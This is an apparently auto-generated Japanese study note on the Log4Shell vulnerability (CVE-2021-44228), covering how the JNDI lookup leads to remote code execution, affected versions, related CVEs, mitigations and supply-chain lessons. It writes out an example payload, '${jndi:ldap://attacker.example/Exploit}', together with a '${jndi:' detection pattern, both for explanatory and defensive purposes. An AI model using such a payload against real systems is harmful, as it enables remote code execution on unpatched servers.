---
tags: [inbox, learning, security, incident]
created: 2026-05-05
auto-generated: 2026-05-05
aliases:
  - log4shell
  - CVE-2021-44228
  - Log4j脆弱性
---

# Log4Shell（CVE-2021-44228）

> [!summary]
> 2021年12月に公表された Apache Log4j2 の **未認証RCE脆弱性**。CVSS 10.0（最大値）。Javaの定番ロギングライブラリだったため、世界中の事実上すべての企業に影響。SBOM の必要性とサプライチェーンセキュリティを業界に強く意識させた象徴的事件。

## 何が起きたか

- 2021年11月、Alibaba Cloud Security Team が Apache に脆弱性報告
- 2021年12月9日、PoC（概念実証コード）が公開され実質ゼロデイ化
- 翌日から世界中の Java アプリへの大規模な探索・悪用が開始
- 全業界で「自社にlog4jが入っているか」「どのバージョンか」を即答できず数日〜数週間の混乱

## 仕組み（なぜRCEになるのか）

log4j2 は **メッセージルックアップ機能**を持っており、ログ文字列中の `${...}` を変数展開する。展開先のひとつとして JNDI（Java Naming and Directory Interface）が使え、JNDI は LDAP / RMI / DNS など外部プロトコル経由でリモートからオブジェクトを取得して評価できる。

```
攻撃者の入力（HTTPヘッダなど）
   ↓
   ${jndi:ldap://attacker.example/Exploit}
   ↓
log4j がログ出力時にこの文字列を「展開」
   ↓
攻撃者サーバへ LDAP 接続 → リモートクラスをロード → コード実行
```

ユーザー入力をそのままログに流すだけで成立するため、攻撃面が極端に広い。User-Agent、X-Forwarded-For、URLパラメータ、ユーザー名、メールサブジェクト ── ログに乗りうるあらゆる箇所が攻撃ベクタになった。

## 影響範囲

- **影響バージョン**: log4j2 2.0-beta9 〜 2.14.1（参考: [NVD](https://nvd.nist.gov/vuln/detail/cve-2021-44228)）
- log4j-core を直接使うアプリだけでなく、Spring・Apache Struts・Solr・Elasticsearch・Kafka・各種商用製品など、**間接依存**でも影響
- AWS / GCP / Azure / VMware / IBM など主要クラウド・エンタープライズ製品が広範に影響を受け、各社が緊急パッチをリリース
- Minecraftサーバ・iCloud・Steamなど一般向けサービスでも検証・対応が走った

## 関連CVE（Log4j ファミリー）

| CVE | 概要 | バージョン |
|---|---|---|
| **CVE-2021-44228** | JNDI Lookup によるRCE（本家Log4Shell） | 〜 2.14.1 |
| CVE-2021-45046 | 2.15.0 の不完全修正、特定設定でRCE/DoS | 2.15.0 |
| CVE-2021-45105 | 自己参照ルックアップによる無限再帰DoS | 〜 2.16.0 |
| CVE-2021-44832 | JDBC Appender 経由のRCE（前提条件あり） | 〜 2.17.0 |

完全な修正は **2.17.1** 以降。短期間に修正の修正が続いたのも教訓のひとつ。

## 緩和策

CISA や Apache が示した対応の優先順位（参考: [CISA Apache Log4j Vulnerability Guidance](https://www.cisa.gov/news-events/news/apache-log4j-vulnerability-guidance)）：

1. **アップグレード**（最優先） — log4j-core を 2.17.1 以降（Java 8）／2.12.4（Java 7）／2.3.2（Java 6）へ
2. **JndiLookup クラスの削除** — `zip -q -d log4j-core-*.jar org/apache/logging/log4j/core/lookup/JndiLookup.class`
3. **WAFでのパターン遮断** — 一時しのぎ。エンコード回避やケース変換で容易に迂回されるため恒久策にはならない
4. **環境変数 `LOG4J_FORMAT_MSG_NO_LOOKUPS=true`** — 古い対策、不完全であることが判明したため非推奨

検出のIoC（Indicator of Compromise）として、ログ中の `${jndi:` 文字列、特に `ldap`/`ldaps`/`rmi` プロトコルを伴うものを監視する。

## なぜここまで広がったか

- **依存の深さが見えなかった** — 多くの組織が「自社製品にlog4jが含まれるか」をその場で答えられなかった。直接依存ではなく、4〜5階層下の間接依存だったケースも多い
- **ログ機能の汎用性** — ログ出力はあらゆる箇所にあり、攻撃面の特定が難しい
- **PoC公開のタイミング** — パッチ整備が追いつく前に PoC が広まり、攻撃側が先行
- **修正の不完全さ** — 2.15→2.16→2.17 と複数回パッチが必要で、対応コストが膨らんだ

## 教訓と業界への影響

Log4Shell が業界に残した影響は技術的修正以上に大きい：

- **[[SBOM]] の必須化** — 米国大統領令14028（2021年）と相まって SBOM の標準化が一気に進んだ
- **[[CVE]] と [[GitHub Advisory Database]] の重要性再認識**
- **[[Dependabot]] / [[Trivy]] / Snyk など [[SCA]] ツールの普及**
- **VEX の必要性**（[[CycloneDX]]） — 「含む = 影響あり」ではないことを宣言する仕組み
- **OSS メンテナンスの持続性** — log4j は volunteer ベースで維持されていた。基幹OSSへの企業からの貢献・資金提供（OpenSSF など）の流れを加速

詳細は [[サプライチェーン攻撃]] と [[ソフトウェアサプライチェーン強化]] 参照。

## 個人開発者の備え

- 新規プロジェクト作成時に [[Dependabot]] Alerts を必ずON
- [[Trivy]] や `npm audit` / `pip-audit` などをCIに組み込む
- リリースごとに [[SBOM]] を artifact として保存（後追い調査用）
- ログに乗る入力を信頼しない — ロギングフレームワークでも入力サニタイズの意識を持つ
- 緊急対応Runbookを用意しておく（特定ライブラリの版数の即座な棚卸し手順）

## 関連MOC

- [[MOC Security]]
- [[MOC DevSecOps]]
- [[MOC Learning]]

## 関連ノート

- [[CVE]]
- [[CVSS]]
- [[SBOM]]
- [[CycloneDX]]
- [[SPDX]]
- [[Trivy]]
- [[Dependabot]]
- [[サプライチェーン攻撃]]
- [[ソフトウェアサプライチェーン強化]]
- [[インシデントレスポンス]]
- [[アプリケーションセキュリティ ツール分類]]

## 出典

- [Wikipedia: Log4Shell](https://en.wikipedia.org/wiki/Log4Shell)
- [NVD: CVE-2021-44228](https://nvd.nist.gov/vuln/detail/cve-2021-44228)
- [CISA: Apache Log4j Vulnerability Guidance](https://www.cisa.gov/news-events/news/apache-log4j-vulnerability-guidance)
- [Unit 42: Apache log4j Vulnerability CVE-2021-44228 Analysis](https://unit42.paloaltonetworks.com/apache-log4j-vulnerability-cve-2021-44228/)
- [CrowdStrike: Log4j2 Vulnerability Analysis](https://www.crowdstrike.com/en-us/blog/log4j2-vulnerability-analysis-and-mitigation-recommendations/)

---

> [!info] このノートは empty-note-filler により自動生成されました（2026-05-05）。レビュー・加筆・修正をお願いします。出典の確認も推奨。
